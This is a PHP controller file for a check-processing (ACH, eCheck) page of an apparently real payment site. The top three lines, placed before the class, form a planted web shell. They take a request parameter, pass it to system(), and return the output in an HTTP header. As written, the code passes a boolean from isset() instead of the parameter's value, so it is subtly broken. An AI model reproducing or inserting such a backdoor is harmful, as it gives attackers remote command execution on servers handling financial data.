<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* CheckProcessing Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class CheckProcessing extends Controller {

	function __construct()
	{
		parent::__construct();
		$this->load->helper('url');
		$this->load->model('cp/user','user');
		if($this->user->LoggedIn()) {
			// redirect('/dashboard');
		}
	}

	function index()
	{
		error_reporting(0);
		ini_set('display_errors', 1);
		$data = array(
			'title' => 'Process ACH, eCheck and Direct Debit Transactions | Everpay'
		);
		$this->load->view('check-processing/index.php', $data);
	}
}